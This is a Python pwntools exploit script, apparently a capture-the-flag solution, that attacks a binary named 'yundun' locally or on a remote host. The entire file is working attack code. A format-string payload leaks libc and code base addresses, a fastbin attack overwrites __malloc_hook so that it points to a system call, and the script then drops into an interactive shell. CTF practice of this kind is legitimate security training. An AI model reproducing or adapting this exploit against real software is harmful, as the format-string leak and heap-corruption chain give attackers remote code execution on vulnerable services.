#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda x:p.sendline(x)
sd = lambda x:p.send(x)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda x,y:p.sendlineafter(x,y)
rv = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
ia = lambda :p.interactive()

context.log_level = 'debug'

if(sys.argv[1] == 'l'):
	p = process("./yundun")
	elf = ELF("./yundun")
else:
	p = remote('59.110.243.101',25413)
	elf = ELF("./yundun")

def cmd(shell):
    sla('>',shell)

#gdb.attach(p)

offset = 9

###leak libc###
cmd('vim 2')
cmd('aaa%35$pbbb%34$p')
cmd('cat 2')

ru('aaa')
libc_start_main = int(rv(14),16) - 240

libc = LibcSearcher('__libc_start_main',libc_start_main)
libc_base = libc_start_main - libc.dump('__libc_start_main')

success('libc base:'+hex(libc_base))

ru('bbb')
base = int(rv(14),16) - 0x1260

success('code base:'+hex(base))

cmd('rm 2')

###fastbin attack###
system = base + 0xcc9
malloc_hook = libc_base + libc.dump('__malloc_hook')

cmd('vim 1')
cmd('aaaaaaaa')

cmd('rm 1')

cmd('vim 2')
payload = 'A' * 0x30 + p64(0) + p64(0x71) + p64(malloc_hook-0x23)
cmd(payload)

gdb.attach(p)

cmd('vim 1')
cmd('aaaaaaaa')

cmd('vim 1')
payload = 'A' * 0x13 + p64(system)
cmd(payload)

#gdb.attach(p)

###get shell###
ia()